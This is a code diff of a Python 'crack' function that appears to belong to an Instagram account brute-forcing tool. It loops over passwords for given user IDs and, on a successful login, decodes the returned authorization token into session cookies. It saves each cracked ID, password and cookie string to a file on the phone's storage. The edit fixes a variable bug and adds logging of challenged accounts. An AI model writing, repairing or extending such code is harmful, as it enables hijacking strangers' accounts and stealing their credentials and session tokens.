@@ -226,38 +226,36 @@ def crack(uid, password_list, total_count):
             )
             # Check response
             if 'logged_in_user' in response.text:
-               print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-               # Clean up the response text by removing escaped backslashes
-               clean_response = str(response.text).replace('\\', '')
-               # Extract IG-Set-Authorization header using walrus operator
-               if not (ig_set_auth_match := re.search(r'"IG-Set-Authorization": "(.*?)"', clean_response)):
-                       return
-               self.ig_set_autorization = ig_set_auth_match.group(1)
-               # Check if Bearer IGT:2: exists using partition
-               bearer_prefix, _, base64_part = self.ig_set_autorization.partition('Bearer IGT:2:')
-               # If no partition found (empty base64_part), return
-               if not base64_part:
-                       return
-               # Add padding if necessary for base64 decoding
-               padding_needed = (4 - len(base64_part) % 4) % 4
-               base64_part += "=" * padding_needed
-               # Decode base64
-               decoded_bytes = base64.urlsafe_b64decode(base64_part)
-               self.decode_ig_set_authorization = json.loads(decoded_bytes.decode('utf-8'))
-               print("\n✓ Successfully decoded IG-Set-Authorization")
-               # Create cookie string from decoded data
-               cookies = ';'.join([f'{name}={value}' for name, value in self.decode_ig_set_authorization.items()])
-               print("\n=== Decoded Cookies ===")
-               for name, value in self.decode_ig_set_authorization.items():
-                       print(f"{name}: {value}")
-               print(f"\n=== Cookie String ===")
-               print(cookies)
-               open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
-               oks.append(uid)
-               return True
-                    
+                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
+                # Clean up the response text by removing escaped backslashes
+                clean_response = str(response.text).replace('\\', '')
+                # Extract IG-Set-Authorization header using walrus operator
+                if not (ig_set_auth_match := re.search(r'"IG-Set-Authorization": "(.*?)"', clean_response)):
+                        return
+                self.ig_set_autorization = ig_set_auth_match.group(1)
+                # Check if Bearer IGT:2: exists using partition
+                bearer_prefix, _, base64_part = self.ig_set_autorization.partition('Bearer IGT:2:')
+                # If no partition found (empty base64_part), return
+                if not base64_part:
+                        return
+                # Add padding if necessary for base64 decoding
+                padding_needed = (4 - len(base64_part) % 4) % 4
+                base64_part += "=" * padding_needed
+                # Decode base64
+                decoded_bytes = base64.urlsafe_b64decode(base64_part)
+                self.decode_ig_set_authorization = json.loads(decoded_bytes.decode('utf-8'))
+                print("\n✓ Successfully decoded IG-Set-Authorization")
+                # Create cookie string from decoded data
+                cookies = ';'.join([f'{name}={value}' for name, value in self.decode_ig_set_authorization.items()])
+                print(f"\n=== Cookie ===")
+                print(cookies)
+                open("/sdcard/SUMON_INS_IDS.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
+                oks.append(uid)
+                return True       
             elif 'challenge_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
+                open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
+                cps.append(uid)
                 continue
             elif 'checkpoint_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
